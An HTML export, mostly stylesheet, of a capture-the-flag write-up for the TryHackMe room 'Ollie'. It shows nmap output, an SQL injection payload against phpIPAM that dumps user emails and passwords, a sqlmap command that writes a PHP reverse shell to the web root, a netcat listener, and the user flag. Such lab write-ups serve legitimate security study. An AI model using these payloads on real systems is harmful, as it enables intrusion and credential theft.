@@ -1,0 +1,793 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Ollie : THM</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+    margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.highlight-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.block-color-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-interactiveBlue { background-color: rgba(35, 131, 226, .07); }
+.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
+.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
+.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
+.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
+.select-value-color-translucentGray { background-color: rgba(255, 255, 255, 0.0375); }
+.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
+.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
+.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
+.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
+.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
+.select-value-color-pageGlass { background-color: undefined; }
+.select-value-color-washGlass { background-color: undefined; }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="964e293c-13df-4e89-8e40-e7b94d211d2f" class="page sans"><header><div class="page-header-icon undefined"><img class="icon" src="https://tryhackme-images.s3.amazonaws.com/room-icons/c9a9e59d232db4474759bbf89a1d821a.jpeg"/></div><h1 class="page-title">Ollie : THM</h1><p class="page-description"></p></header><div class="page-body"><p id="25999ab7-0958-413c-b01e-c2ad2c889a2b" class="">Write-Ups by : drew-byte</p><h2 id="f117dcde-302e-4a7b-9241-8e05d2372bd5" class="">Connection</h2><ul id="ae97da50-cc3c-4433-a420-387fa76b5f80" class="bulleted-list"><li style="list-style-type:disc">Download the ovpn provided by the thm</li></ul><ul id="77ed3761-cc5b-4f9e-8a56-4e6eef1bda05" class="bulleted-list"><li style="list-style-type:disc">Run the ovpn</li></ul><pre id="1206077a-b44b-4850-824d-2072059fe1b8" class="code code-wrap"><code>┌─[drew@parrot]─[~]
+└──╼ $cd Desktop
+┌─[drew@parrot]─[~/Desktop]
+└──╼ $sudo openvpn shanetydraw.ovpn</code></pre><hr id="8e491c59-180c-4afd-8fab-f231049160a2"/><h2 id="1451c991-9f8d-4b1a-8650-9f36307daa33" class="">What is the user.txt flag?</h2><ul id="87ef0548-d132-4533-92d1-3609e9b83982" class="bulleted-list"><li style="list-style-type:disc">nmap result</li></ul><pre id="fe065583-cc4a-4b7c-86f9-dffe889fcb35" class="code code-wrap"><code>─[drew@parrot]─[~]
+└──╼ $nmap -A -p- 10.10.46.110 -T4 -Pn
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-11 21:10 PST
+Nmap scan report for 10.10.46.110 (10.10.46.110)
+Host is up (0.38s latency).
+Not shown: 65532 closed tcp ports (conn-refused)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 b71ba8f88c8a4a5355c02e8901f25669 (RSA)
+|   256 4e2743b6f454f918d038dacd769b8548 (ECDSA)
+|_  256 1482cabb04e501839cd654e9d1fac482 (ED25519)
+80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
+| http-title: Ollie :: login
+|_Requested resource was http://10.10.46.110/index.php?page=login
+| http-robots.txt: 2 disallowed entries 
+|_/ /immaolllieeboyyy
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+1337/tcp open  waste?
+| fingerprint-strings: 
+
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 1183.70 seconds</code></pre><ul id="e73754e2-8a61-43ba-8f52-3587aef0fe18" class="bulleted-list"><li style="list-style-type:disc">A login page</li></ul><figure id="0406247e-2fb4-4737-ac2a-13184acf9947" class="image"><a href="../Ollie%2024be7a424ed84cd39fafe93639a0a217/Untitled.png"><img style="width:920px" src="../Ollie%2024be7a424ed84cd39fafe93639a0a217/Untitled.png"/></a></figure><ul id="4e22b13e-6ffc-431e-badd-3ad33ee3b7c5" class="bulleted-list"><li style="list-style-type:disc">robots.txt</li></ul><figure id="b7c346dc-90da-4865-ad1c-0be12c1648f1" class="image"><a href="../Ollie%2024be7a424ed84cd39fafe93639a0a217/Untitled%201.png"><img style="width:920px" src="../Ollie%2024be7a424ed84cd39fafe93639a0a217/Untitled%201.png"/></a></figure><p id="80be76ec-b6bd-4467-a774-aceac321222a" class="">the directory is a youtube video singing the song island boy</p><ul id="11844bb5-444c-4a19-a905-9af96af726e2" class="bulleted-list"><li style="list-style-type:disc">Let’s connect to the port 1337</li></ul><pre id="8a588c31-79bb-402d-9416-701d03c49944" class="code code-wrap"><code>┌─[drew@parrot]─[~]
+└──╼ $nc 10.10.46.110 1337
+Hey stranger, I&#x27;m Ollie, protector of panels, lover of deer antlers.
+
+What is your name? stranger
+What&#x27;s up, Stranger! It&#x27;s been a while. What are you here for? password
+Ya&#x27; know what? Stranger. If you can answer a question about me, I might have something for you.
+
+
+What breed of dog am I? I&#x27;ll make it a multiple choice question to keep it easy: Bulldog, Husky, Duck or Wolf? Bulldog
+You are correct! Let me confer with my trusted colleagues; Benny, Baxter and Connie...
+Please hold on a minute
+Ok, I&#x27;m back.
+After a lengthy discussion, we&#x27;ve come to the conclusion that you are the right person for the job.Here are the credentials for our administration panel.
+
+                    Username: admin
+
+                    Password: OllieUnixMontgomery!
+
+PS: Good luck and next time bring some treats!</code></pre><ul id="87470b62-be22-43c1-918b-35604ddcbe16" class="bulleted-list"><li style="list-style-type:disc">It’s an account let’s try this account to the ollie page</li></ul><ul id="1c570ced-b56b-46e1-9884-da288841c0f0" class="bulleted-list"><li style="list-style-type:disc">I try to searchsploit to find the exploit in the version of phpipam and I found one the version is 1.4.5 and after I run it this is my code</li></ul><pre id="d8192567-fc17-4125-a6e6-17c187f13c47" class="code code-wrap"><code>┌─[drew@parrot]─[~]
+└──╼ $python3 50963.py -url http://10.10.46.110 -usr admin -pwd OllieUnixMontgomery! -cmd &quot;cat user.txt&quot; --path /home/drew/Desktop
+
+/usr/lib/python3/dist-packages/requests/__init__.py:87: RequestsDependencyWarning: urllib3 (1.26.5) or chardet (5.1.0) doesn&#x27;t match a supported version!
+  warnings.warn(&quot;urllib3 ({}) or chardet ({}) doesn&#x27;t match a supported &quot;
+
+█▀█ █░█ █▀█ █ █▀█ ▄▀█ █▀▄▀█   ▄█ ░ █░█ ░ █▀   █▀ █▀█ █░░ █   ▀█▀ █▀█   █▀█ █▀▀ █▀▀
+█▀▀ █▀█ █▀▀ █ █▀▀ █▀█ █░▀░█   ░█ ▄ ▀▀█ ▄ ▄█   ▄█ ▀▀█ █▄▄ █   ░█░ █▄█   █▀▄ █▄▄ ██▄
+
+█▄▄ █▄█   █▄▄ █▀▀ █░█ █ █▄░█ █▀▄ █▄█ █▀ █▀▀ █▀▀
+█▄█ ░█░   █▄█ ██▄ █▀█ █ █░▀█ █▄▀ ░█░ ▄█ ██▄ █▄▄
+
+[...] Trying to log in as admin
+[+] Login successful!
+[...] Exploiting
+[-] Something went wrong. Maybe the path isn&#x27;t writable. You can still abuse of the SQL injection vulnerability at http://10.10.46.110/index.php?page=tools&amp;section=routing&amp;subnetId=bgp&amp;sPage=1</code></pre><ul id="ecf71087-2bb8-4509-96ad-9ba2aa15def1" class="bulleted-list"><li style="list-style-type:disc">It says that I can use SQL injection </li></ul><figure id="33e0df80-6b48-418e-b672-351ee11ee9cc" class="image"><a href="../Ollie%2024be7a424ed84cd39fafe93639a0a217/Untitled%202.png"><img style="width:764px" src="../Ollie%2024be7a424ed84cd39fafe93639a0a217/Untitled%202.png"/></a></figure><ul id="c2f0f241-7232-482b-a3d5-979f62f4a776" class="bulleted-list"><li style="list-style-type:disc">So I try other exploit that are using sql injection</li></ul><ul id="0a7fc550-dff5-4abd-b6a4-6731c2945bb7" class="bulleted-list"><li style="list-style-type:disc">After I installed I read the code of <a href="http://50684.py">50684.py</a> and I need to use a burpsuite or zap to see and manipulate the proxy first I connected it to my burp and my intercept is on I follow the instruction here at </li></ul><figure id="ad728e67-ec98-48f1-8fc0-d8601c2b11eb" class="image"><a href="../Ollie%2024be7a424ed84cd39fafe93639a0a217/Untitled%203.png"><img style="width:989px" src="../Ollie%2024be7a424ed84cd39fafe93639a0a217/Untitled%203.png"/></a></figure><ul id="ddec20c8-08e1-4e0a-9867-00c683aad616" class="bulleted-list"><li style="list-style-type:disc">after I try this the sqli is running. so let’s proceed, I run the burpsuite to intercept the input there</li></ul><figure id="90bdbf7d-f2c0-4cb9-ba63-2d618ebe03ed" class="image"><a href="../Ollie%2024be7a424ed84cd39fafe93639a0a217/Untitled%204.png"><img style="width:989px" src="../Ollie%2024be7a424ed84cd39fafe93639a0a217/Untitled%204.png"/></a></figure><ul id="23fbc6de-e938-43f4-aba5-085aed36e995" class="bulleted-list"><li style="list-style-type:disc">In the “a” I change the a to the code that I got at my <a href="http://exploit.py">exploit.py</a> which is</li></ul><pre id="19f0eec9-5212-48cb-a3d6-b17059a658c8" class="code code-wrap"><code>&quot;union select(select concat(@:=0x3a,(select+count(*) from(users)where(@:=concat(@,email,0x3a,password,&quot;0x3a&quot;,2fa))),@)),2,3,user() -- -&quot;</code></pre><figure id="e20c4f77-4fa4-45a5-a78f-721836a9814a" class="image"><a href="../Ollie%2024be7a424ed84cd39fafe93639a0a217/Untitled%205.png"><img style="width:989px" src="../Ollie%2024be7a424ed84cd39fafe93639a0a217/Untitled%205.png"/></a></figure><ul id="88338c45-ef2f-4299-b582-bf9f2a153ab8" class="bulleted-list"><li style="list-style-type:disc">And I make all the character as a url to ensure that it will execute after that I received this</li></ul><figure id="d3f45915-166f-4665-ae29-928a4c57d942" class="image"><a href="../Ollie%2024be7a424ed84cd39fafe93639a0a217/Untitled%206.png"><img style="width:989px" src="../Ollie%2024be7a424ed84cd39fafe93639a0a217/Untitled%206.png"/></a></figure><ul id="40228a61-0553-4eeb-aba5-204bfb4c5501" class="bulleted-list"><li style="list-style-type:disc">Let’s save this and the file name is “req” now let’s search about how to write in sqlmap</li></ul><figure id="6d9afc37-e4d6-4d32-89bd-97684f488427"><a href="https://www.hackingarticles.in/file-system-access-on-webserver-using-sqlmap/" class="bookmark source"><div class="bookmark-info"><div class="bookmark-text"><div class="bookmark-title">File System Access on Webserver using Sqlmap - Hacking Articles</div><div class="bookmark-description">Hello everyone and welcome to the par two of our sqlmap series. In this article, we’ll be exploiting an error based SQL injection to upload</div></div><div class="bookmark-href"><img src="https://www.hackingarticles.in/favicon.ico" class="icon bookmark-icon"/>https://www.hackingarticles.in/file-system-access-on-webserver-using-sqlmap/</div></div><img src="https://4.bp.blogspot.com/-QoA7Q3lPo3Q/W0oghod1tOI/AAAAAAAAYE0/uSr06Qr59KkZgu705EYYys2HAsFbDxcjwCLcBGAs/s1600/0.png" class="bookmark-image"/></a></figure><pre id="f0357aca-930a-4c6b-8b99-c16f42e3e04e" class="code code-wrap"><code>sqlmap -u 192.168.1.124/sqli/Less-1.?id=1 --file-write=/root/Desktop/shell.php --file-dest=/xampp/htdocs/shell.php --batch
+&quot;I&#x27;ll follow this format for my pentestmonkey&quot;</code></pre><pre id="49438b7a-0668-4e25-ac39-abf8d64cfdcd" class="code code-wrap"><code>┌─[drew@parrot]─[~/Desktop]
+└──╼ $sqlmap -r req --batch --file-write=&quot;php-reverse-shell.php&quot; --file-dest=/var/www/html/&quot;php-reverse-shell.php&quot;
+        ___
+       __H__
+ ___ ___[&#x27;]_____ ___ ___  {1.6.12#stable}
+|_ -| . [,]     | .&#x27;| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+
+
+[*] ending @ 16:46:01 /2023-06-12/</code></pre><ul id="c1939e69-0536-44a9-b591-9786f2c983ac" class="bulleted-list"><li style="list-style-type:disc">Now let’s listen to our host to connect</li></ul><pre id="b14193dc-43ad-4412-81ab-9f76e1fbb74f" class="code code-wrap"><code>nc -lvnp 9000
+&quot;Run this in the browser http://10.10.58.199/php-reverse-shell.php&quot;
+
+&quot;After that we have the shell before that I import a stable shell&quot;
+
+python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</code></pre><ul id="686c2b15-5125-44ef-a74c-09cc03c374a2" class="bulleted-list"><li style="list-style-type:disc">Let’s find the user.txt</li></ul><pre id="3d48fd16-2fd9-4adb-a105-c4485bd555db" class="code code-wrap"><code>www-data@hackerdog:/$ ls
+bin   etc   lib32   lost+found	opt   run   srv       test  var
+boot  home  lib64   media	proc  sbin  swap.img  tmp
+dev   lib   libx32  mnt		root  snap  sys       usr
+www-data@hackerdog:/$ cd home
+www-data@hackerdog:/home$ ls
+ollie
+www-data@hackerdog:/home$ su ollie
+Password: 
+ollie@hackerdog:/home$ ls
+ollie
+ollie@hackerdog:/home$ cd ollie
+ollie@hackerdog:~$ ls
+user.txt
+ollie@hackerdog:~$ cat user.txt
+THM{Ollie_boi_is_daH_Cut3st}
